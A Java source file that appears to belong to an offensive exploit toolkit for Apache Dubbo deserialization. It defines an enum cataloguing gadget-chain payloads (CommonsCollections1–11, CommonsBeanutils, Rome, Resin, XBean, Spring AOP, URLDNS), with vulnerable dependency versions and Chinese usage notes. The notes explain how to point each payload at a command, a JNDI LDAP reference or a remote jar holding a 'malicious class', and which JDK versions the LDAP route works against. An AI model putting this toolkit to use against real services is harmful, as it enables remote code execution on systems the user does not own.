package com.threedr3am.exp.dubbo.payload;

import com.threedr3am.exp.dubbo.payload.hessian.ResinPoc;
import com.threedr3am.exp.dubbo.payload.hessian.RomePoc;
import com.threedr3am.exp.dubbo.payload.hessian.SpringAbstractBeanFactoryPointcutAdvisorPoc;
import com.threedr3am.exp.dubbo.payload.hessian.XBeanPoc;
import com.threedr3am.exp.dubbo.payload.java.CommonsBeanutils;
import com.threedr3am.exp.dubbo.payload.java.CommonsBeanutils1;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections1;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections10;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections11;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections2;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections3;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections3ForLoadJar;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections4;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections5;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections5ForLoadJar;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections6;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections6ForLoadJar;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections7;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections8;
import com.threedr3am.exp.dubbo.payload.java.CommonsCollections9;
import com.threedr3am.exp.dubbo.payload.java.URLDNS;

/**
 * @author threedr3am
 */
public enum Payloads {
  RESIN("resin", 2, new ResinPoc(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "hessian", "com.caucho:quercus:*"),
  ROME("rome", 1, new RomePoc(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "hessian", "com.rometools:rome:*"),
  SPRING_AOP("spring-aop", 1, new SpringAbstractBeanFactoryPointcutAdvisorPoc(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "hessian", "org.springframework:spring-aop"),
  XBEAN("xbean", 2, new XBeanPoc(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "hessian", "org.apache.xbean:xbean-naming:*"),

  CommonsBeanutils("CommonsBeanutils", 1, new CommonsBeanutils(), "arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）", "java", ""),
  CommonsBeanutils1("CommonsBeanutils1", 1, new CommonsBeanutils1(), "arg[0]=cmd", "java", "commons-beanutils:commons-beanutils:1.9.2"),
  CommonsCollections1("CommonsCollections1", 1, new CommonsCollections1(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections2("CommonsCollections2", 1, new CommonsCollections2(), "arg[0]=cmd", "java", "org.apache.commons:commons-collections4:4.0"),
  CommonsCollections3("CommonsCollections3", 1, new CommonsCollections3(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections3ForLoadJar("CommonsCollections3ForLoadJar", 2, new CommonsCollections3ForLoadJar(), "arg[0]=jar包下载地址，例：http://127.0.0.1:8080/R.jar，arg[1]=jar包中恶意类名称", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections4("CommonsCollections4", 1, new CommonsCollections4(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections5("CommonsCollections5", 1, new CommonsCollections5(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections5ForLoadJar("CommonsCollections5ForLoadJar", 2, new CommonsCollections5ForLoadJar(), "arg[0]=jar包下载地址，例：http://127.0.0.1:8080/R.jar，arg[1]=jar包中恶意类名称", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections6("CommonsCollections6", 1, new CommonsCollections6(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections6ForLoadJar("CommonsCollections6ForLoadJar", 2, new CommonsCollections6ForLoadJar(), "arg[0]=jar包下载地址，例：http://127.0.0.1:8080/R.jar，arg[1]=jar包中恶意类名称", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections7("CommonsCollections7", 1, new CommonsCollections7(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections8("CommonsCollections8", 1, new CommonsCollections8(), "arg[0]=cmd", "java", "org.apache.commons:commons-collections4:4.0"),
  CommonsCollections9("CommonsCollections9", 1, new CommonsCollections9(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections10("CommonsCollections10", 1, new CommonsCollections10(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
  CommonsCollections11("CommonsCollections11", 1, new CommonsCollections11(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.2.1"),
  URLDNS("URLDNS", 1, new URLDNS(), "arg[0]=dns server url", "java", ""),

  ;

  private String name;
  private int paramSize;
  private Payload payload;
  private String paramTis;
  private String serialization;
  private String dependency;

  Payloads(String name, int paramSize, Payload payload, String paramTis,
      String serialization, String dependency) {
    this.name = name;
    this.paramSize = paramSize;
    this.payload = payload;
    this.paramTis = paramTis;
    this.serialization = serialization;
    this.dependency = dependency;
  }

  public String getName() {
    return name;
  }

  public int getParamSize() {
    return paramSize;
  }

  public Payload getPayload() {
    return payload;
  }

  public String getParamTis() {
    return paramTis;
  }

  public String getSerialization() {
    return serialization;
  }

  public String getDependency() {
    return dependency;
  }

  public static Payloads getPayload(String name, String serialization) {
    if (name == null)
      return null;
    Payloads[] payloads = Payloads.values();
    Payloads res = null;
    for (int i = 0; i < Payloads.values().length; i++) {
      if (payloads[i].name.equalsIgnoreCase(name)) {
        res = payloads[i];
        break;
      }
    }
    return res.getSerialization().equalsIgnoreCase(serialization) ? res : null;
  }
}
